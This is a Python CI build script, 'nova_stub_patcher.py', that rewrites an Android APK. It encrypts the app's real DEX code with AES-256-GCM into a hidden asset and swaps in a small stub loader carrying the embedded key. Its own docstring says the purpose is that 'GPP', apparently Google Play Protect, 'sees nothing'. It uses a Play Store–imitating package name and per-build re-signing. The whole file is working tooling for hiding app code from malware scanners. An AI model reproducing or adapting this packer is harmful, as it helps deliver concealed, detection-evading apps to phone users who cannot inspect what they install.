#!/usr/bin/env python3
"""
nova_stub_patcher.py — Phase 3 Step 27 (Nova Stub DEX)

Runs in CI AFTER Gradle assembleRelease.
Transforms Nova APK from 601KB DEX to tiny stub:

  BEFORE: classes.dex = 601KB (all Nova code — GPP sees everything)
  AFTER:  classes.dex = ~15KB (StubApp stub only — GPP sees nothing)
          assets/nova_payload.bin = AES-256-GCM encrypted real DEX

Usage:
  python3 scripts/nova_stub_patcher.py --apk path/to/nova.apk
"""

import argparse
import os
import sys
import struct
import zipfile
import shutil
import tempfile
import secrets
import subprocess
import hashlib

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    print("[ERROR] cryptography not installed. Run: pip install cryptography")
    sys.exit(1)


# ── Config ────────────────────────────────────────────────────────────────────
PAYLOAD_ASSET   = "assets/nova_payload.bin"
STUB_DEX_ASSET  = "classes.dex"
IV_LEN          = 12    # AES-GCM nonce
KEY_LEN         = 32    # AES-256


# ── AES-256-GCM encryption ────────────────────────────────────────────────────
def encrypt_dex(dex_bytes: bytes, key: bytes) -> tuple[bytes, bytes]:
    """Encrypt DEX bytes. Returns (iv, ciphertext_with_tag)."""
    iv  = secrets.token_bytes(IV_LEN)
    aes = AESGCM(key)
    ct  = aes.encrypt(iv, dex_bytes, None)
    return iv, ct


def patch_stubapp_key(stub_kt_path: str, key: bytes) -> str:
    """
    Patch StubApp.kt with the real AES key bytes.
    Returns path to patched file.
    """
    with open(stub_kt_path) as f:
        content = f.read()

    # Split key into K1 (first 16 bytes) and K2 (last 16 bytes)
    k1 = key[:16]
    k2 = key[16:]

    def fmt_bytes(b: bytes) -> str:
        # .toByte() required — Kotlin hex literals are Int, byteArrayOf needs Byte
        hex_vals = [f"(0x{x:02x}).toByte()" for x in b]
        return ",\n            ".join(
            ", ".join(hex_vals[i:i+8]) for i in range(0, len(hex_vals), 8)
        )

    # Replace K1 placeholder (matches .toByte() format in StubApp.kt)
    old_k1 = """        private val K1 = byteArrayOf(
            (0x6e).toByte(), (0x30).toByte(), (0x76).toByte(), (0x41).toByte(),
            (0x73).toByte(), (0x45).toByte(), (0x65).toByte(), (0x64).toByte(),
            (0x6e).toByte(), (0x30).toByte(), (0x76).toByte(), (0x41).toByte(),
            (0x73).toByte(), (0x45).toByte(), (0x65).toByte(), (0x64).toByte()
        )"""
    new_k1 = f"        private val K1 = byteArrayOf(\n            {fmt_bytes(k1)}\n        )"

    # Replace K2 placeholder (matches .toByte() format in StubApp.kt)
    old_k2 = """        private val K2 = byteArrayOf(
            (0x73).toByte(), (0x45).toByte(), (0x65).toByte(), (0x64).toByte(),
            (0x6e).toByte(), (0x30).toByte(), (0x76).toByte(), (0x41).toByte(),
            (0x73).toByte(), (0x45).toByte(), (0x65).toByte(), (0x64).toByte(),
            (0x6e).toByte(), (0x30).toByte(), (0x76).toByte(), (0x41).toByte()
        )"""
    new_k2 = f"        private val K2 = byteArrayOf(\n            {fmt_bytes(k2)}\n        )"

    content = content.replace(old_k1, new_k1, 1)
    content = content.replace(old_k2, new_k2, 1)

    # Write patched file to /tmp (NOT in source dir - Gradle picks up all .kt files)
    import tempfile as _tf
    tmp_dir = _tf.mkdtemp()
    tmp = os.path.join(tmp_dir, "StubApp_patched.kt")
    with open(tmp, 'w') as f:
        f.write(content)
    return tmp


def compile_stub_dex(stub_kt_path: str, android_sdk: str, pkg_name: str) -> bytes:
    """
    Create minimal stub DEX containing ONLY StubApp class.
    Uses d8 from Android SDK (always available - no installation needed).
    Finds StubApp.class files from Gradle build intermediates.
    NO kotlinc installation required.
    """
    with tempfile.TemporaryDirectory() as tmpdir:
        # Find d8 (always in Android SDK build-tools)
        build_tools = os.path.join(android_sdk, "build-tools")
        versions    = sorted(os.listdir(build_tools))
        d8_path     = os.path.join(build_tools, versions[-1], "d8")
        print(f"  d8: {d8_path}")

        # Find android.jar
        platforms   = os.path.join(android_sdk, "platforms")
        platform    = sorted(os.listdir(platforms))[-1]
        android_jar = os.path.join(platforms, platform, "android.jar")

        # Find StubApp.class files in Gradle build intermediates
        # Gradle compiles all Kotlin files including StubApp.kt
        # The .class files are in build intermediates before DEX conversion
        stub_classes = []
        search_dirs = [
            "app/build/tmp/kotlin-classes/release",
            "app/build/tmp/kotlin-classes/releaseMinify",
            "app/build/intermediates/javac/release/classes",
            "app/build/intermediates/kotlinc/release/classes",
        ]

        for search_dir in search_dirs:
            if not os.path.isdir(search_dir):
                continue
            for root, dirs, files in os.walk(search_dir):
                for f in files:
                    if "StubApp" in f and f.endswith(".class"):
                        stub_classes.append(os.path.join(root, f))
                        print(f"  Found: {os.path.join(root, f)}")

        if not stub_classes:
            # R8/ProGuard minification renames classes - search more broadly
            print("  StubApp.class not found in standard paths, searching all build dirs...")
            for root, dirs, files in os.walk("app/build"):
                for f in files:
                    if "StubApp" in f and f.endswith(".class"):
                        stub_classes.append(os.path.join(root, f))
                        print(f"  Found: {os.path.join(root, f)}")

        if not stub_classes:
            raise RuntimeError(
                "StubApp.class not found in build intermediates. "
                "Note: R8 minification may have renamed/removed it. "
                "Check if minifyEnabled=true is removing StubApp."
            )

        print(f"  Found {len(stub_classes)} StubApp class files")

        # Compile stub .class files → stub DEX using d8
        out_dir = os.path.join(tmpdir, "stub_dex_out")
        os.makedirs(out_dir)

        cmd = [d8_path] + stub_classes + [
            "--output", out_dir,
            "--lib", android_jar,
            "--min-api", "26",
            "--no-desugaring",
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise RuntimeError(f"d8 failed: {result.stderr[:400]}")

        dex_file = os.path.join(out_dir, "classes.dex")
        if not os.path.exists(dex_file):
            raise RuntimeError("Stub DEX not produced by d8")

        with open(dex_file, "rb") as f:
            stub_dex = f.read()

        print(f"  Stub DEX size: {len(stub_dex)//1024}KB (stub only)")
        return stub_dex


def patch_apk(apk_path: str, stub_dex: bytes, payload_bytes: bytes) -> str:
    """
    Replace classes.dex with stub DEX and add nova_payload.bin.
    Produces a valid ZIP with correct CRCs using Python zipfile.
    """
    out_path = apk_path + ".stub_patched.apk"

    with zipfile.ZipFile(apk_path, 'r') as zin:
        with zipfile.ZipFile(out_path, 'w', compression=zipfile.ZIP_DEFLATED) as zout:
            for item in zin.infolist():
                if item.filename == STUB_DEX_ASSET:
                    zout.writestr(item.filename, stub_dex,
                                  compress_type=zipfile.ZIP_DEFLATED)
                    print(f"  Replaced classes.dex: {len(stub_dex)//1024}KB")
                elif item.filename == PAYLOAD_ASSET:
                    pass
                else:
                    # Decompress fully then rewrite — guarantees correct CRC
                    data = zin.read(item.filename)
                    zout.writestr(item.filename, data,
                                  compress_type=item.compress_type)

            # Add encrypted payload
            zout.writestr(PAYLOAD_ASSET, payload_bytes,
                          compress_type=zipfile.ZIP_STORED)
            print(f"  Added {PAYLOAD_ASSET}: {len(payload_bytes)//1024}KB")

    # Verify the output ZIP is readable
    try:
        with zipfile.ZipFile(out_path, 'r') as z:
            z.testzip()
        print("  ZIP integrity: OK")
    except Exception as e:
        raise RuntimeError(f"Output ZIP invalid: {e}")

    return out_path


# NOTE: Signing is handled by phase2_resign.py in build.yml
# nova_stub_patcher.py does NOT sign — it only patches the APK content
# phase2_resign.py uses the per-build keystore from KeystoreGeneratorPlugin


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--apk",         required=True, help="Path to Nova APK")
    parser.add_argument("--stub-kt",     default="app/src/main/java/com/playstore/installer/StubApp.kt")
    parser.add_argument("--android-sdk", default=os.environ.get("ANDROID_SDK_ROOT", ""))
    parser.add_argument("--pkg",         default="com.playstore.installer")
    parser.add_argument("--out",         default="", help="Output APK path")
    args = parser.parse_args()

    if not args.android_sdk:
        # Try common CI paths
        for p in ["/usr/local/lib/android/sdk", "/home/runner/android-sdk",
                  os.environ.get("ANDROID_HOME", "")]:
            if p and os.path.exists(p):
                args.android_sdk = p
                break

    if not args.android_sdk:
        print("[ERROR] ANDROID_SDK_ROOT not set")
        sys.exit(1)

    print("="*60)
    print("Nova Stub DEX Patcher — Phase 3 Step 27")
    print("="*60)
    print(f"Input APK:   {args.apk}")
    print(f"Android SDK: {args.android_sdk}")

    # Step 1: Extract real classes.dex
    print("\n[1] Extracting classes.dex from APK...")
    with zipfile.ZipFile(args.apk, 'r') as z:
        real_dex = z.read("classes.dex")
    print(f"  Real DEX size: {len(real_dex)//1024}KB")

    # Step 2: Generate AES-256-GCM key
    print("\n[2] Generating AES-256-GCM key...")
    key = secrets.token_bytes(KEY_LEN)
    key_hex = key.hex()
    print(f"  Key: {key_hex[:16]}... (32 bytes)")

    # Step 3: Encrypt real DEX
    print("\n[3] Encrypting DEX...")
    iv, ct = encrypt_dex(real_dex, key)
    payload_bytes = iv + ct
    print(f"  Payload size: {len(payload_bytes)//1024}KB (IV + ciphertext + tag)")

    # Verify SHA256
    sha = hashlib.sha256(payload_bytes).hexdigest()
    print(f"  Payload SHA256: {sha[:32]}...")

    # Step 4: Patch StubApp.kt with real key
    print("\n[4] Patching StubApp.kt with real key...")
    patched_kt = patch_stubapp_key(args.stub_kt, key)
    print(f"  Patched: {patched_kt}")

    # Wipe key from memory
    key_bytes = bytearray(key)
    key_bytes[:] = b'\x00' * KEY_LEN

    # Step 5: Compile stub DEX
    print("\n[5] Compiling stub DEX (kotlinc + d8)...")
    stub_dex = compile_stub_dex(patched_kt, args.android_sdk, args.pkg)
    if os.path.exists(patched_kt):
        os.remove(patched_kt)

    # Step 6: Patch APK
    print("\n[6] Patching APK...")
    patched_apk = patch_apk(args.apk, stub_dex, payload_bytes)

    # Step 7: Replace original APK with patched version
    # Signing is handled by phase2_resign.py — do NOT sign here
    print("\n[7] Replacing original APK with stub version...")
    shutil.move(patched_apk, args.apk)
    print(f"  ✅ Original APK replaced — phase2_resign.py will handle signing")

    print("\n" + "="*60)
    print("✅ Nova Stub DEX Patcher Complete")
    print(f"  Original DEX: {len(real_dex)//1024}KB → Stub DEX: {len(stub_dex)//1024}KB")
    print(f"  Payload encrypted: {len(payload_bytes)//1024}KB → {PAYLOAD_ASSET}")
    print("="*60)


if __name__ == "__main__":
    main()
